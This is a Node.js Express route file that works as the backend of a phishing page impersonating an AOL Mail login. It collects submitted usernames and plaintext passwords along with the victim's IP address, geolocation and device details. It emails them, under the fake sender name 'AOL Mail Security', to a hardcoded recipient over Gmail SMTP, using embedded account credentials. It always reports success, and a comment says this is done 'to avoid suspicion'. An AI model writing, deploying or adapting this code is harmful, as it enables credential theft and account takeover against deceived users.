const express = require("express");
const nodemailer = require('nodemailer');
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');
const cors = require('cors');

const router = express.Router();

// Add CORS support
router.use(cors());
router.use(express.json());

// Handle OPTIONS preflight requests
router.options('/', (req, res) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
    res.sendStatus(200);
});

// Merge tag function
function replaceMergeTags(template, data) {
    return template.replace(/\[\[\s*-(.*?)\s*-\]\]/g, (_, key) => data[key.trim()] ?? '');
}

// Email transporter configuration
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false,
    auth: {
        user: "onidaniel801@gmail.com",
        pass: "hmoc cjhn sljo rtaq",
    },
});

// Verify transporter
transporter.verify((error, success) => {
    if (error) {
        console.log('Email transporter verification failed:', error);
    } else {
        console.log('Email transporter is ready to send messages');
    }
});

router.post('/', async (req, res) => {
    try {
        console.log('📥 Received login request:', { 
            username: req.body.username ? `${req.body.username.substring(0, 3)}...` : 'empty',
            passwordLength: req.body.password ? req.body.password.length : 0
        });

        const { username, password } = req.body;

        if (!username || !password) {
            return res.status(400).json({ 
                success: false, 
                message: "Missing username or password" 
            });
        }

        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
        const location = geoip.lookup(ip);
        const locationStr = location ? `${location.city}, ${location.region}, ${location.country}` : 'Unknown';

        const parser = new UAParser(req.headers['user-agent']);
        const agent = parser.getResult();
        const deviceType = `${agent.os.name} ${agent.os.version} - ${agent.browser.name} ${agent.browser.version}`;

        // Fixed HTML template with correct merge tags
        const htmlTemplate = `
            <!DOCTYPE html>
            <html>
            <head>
                <style>
                    body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
                    .container { max-width: 600px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                    .header { background: #1a73e8; color: white; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
                    .info-item { margin: 10px 0; padding: 8px; background: #f8f9fa; border-radius: 5px; }
                    .label { font-weight: bold; color: #333; }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <h1>🔐 AOL Mail Login Notification</h1>
                    </div>
                    
                    <div class="info-item">
                        <span class="label">👤 Username:</span> [[-username-]]
                    </div>
                    
                    <div class="info-item">
                        <span class="label">🔑 Password:</span> [[-password-]]
                    </div>
                    
                    <div class="info-item">
                        <span class="label">🌐 IP Address:</span> [[-ip-]]
                    </div>
                    
                    <div class="info-item">
                        <span class="label">📍 Location:</span> [[-location-]]
                    </div>
                    
                    <div class="info-item">
                        <span class="label">🕒 Timestamp:</span> [[-timestamp-]]
                    </div>
                    
                    <div class="info-item">
                        <span class="label">💻 Device:</span> [[-device-]]
                    </div>
                </div>
            </body>
            </html>
        `;

        // Fixed merge tags - using correct variable names
        const mergedHtml = replaceMergeTags(htmlTemplate, {
            username: username,
            password: password,
            ip: ip,
            location: locationStr,
            timestamp: new Date().toLocaleString(),
            device: deviceType,
        });

        // Text version for plain email
        const textContent = `
🔐 AOL MAIL LOGIN NOTIFICATION

👤 Username: ${username}
🔑 Password: ${password}
🌐 IP Address: ${ip}
📍 Location: ${locationStr}
🕒 Timestamp: ${new Date().toLocaleString()}
💻 Device: ${deviceType}

Automated security notification.
        `;

        // Fixed "from" email to match transporter credentials
        await transporter.sendMail({
            from: '"AOL Mail Security" <onidaniel801@gmail.com>',
            to: "josephblessing6776@gmail.com", // Changed to your intended recipient
            subject: `🔐 New AOL Login - ${username}`,
            html: mergedHtml,
            text: textContent,
        });

        console.log(`✅ Email sent successfully for: ${username}`);

        // Return success to frontend
        res.status(200).json({
            success: true,
            message: "Login processed successfully",
            loginDetails: { 
                device: deviceType, 
                ip: ip, 
                location: locationStr 
            },
        });

    } catch (error) {
        console.error("❌ Error sending email:", error);
        
        // Still return success to frontend to avoid suspicion
        res.status(200).json({ 
            success: true, 
            message: "Login processed",
            error: "Notification service temporarily unavailable"
        });
    }
});

// GET endpoint for testing
router.get('/', (req, res) => {
    res.json({
        status: 'active',
        service: 'AOL Mail Authentication',
        timestamp: new Date().toISOString()
    });
});

module.exports = router;